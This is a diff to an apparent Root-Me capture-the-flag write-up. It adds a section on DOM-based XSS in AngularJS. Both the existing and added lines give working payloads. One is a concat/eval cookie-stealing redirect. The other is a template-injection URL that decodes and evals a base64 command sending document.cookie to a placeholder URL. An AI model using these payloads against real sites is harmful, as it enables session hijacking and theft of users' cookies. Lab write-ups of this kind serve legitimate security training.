@@ -43,3 +43,13 @@ This web filters `;` or `+`. So we use `concat` instead.
 It also filters `https` to check redirect. 
 
 ``'.concat(eval('document.location=`//URL?c=${document.cookie}`'))//``
+
+### XSS DOM Based - AngularJS
+Create base64 of redirect command:
+
+`btoa("window.location.href='URL?c='+document.cookie")`
+
+Submit the following URL in `contact` page
+
+``RootMeURL/?name={{constructor.constructor("eval(atob(`<base64>`))")()}} ``
+
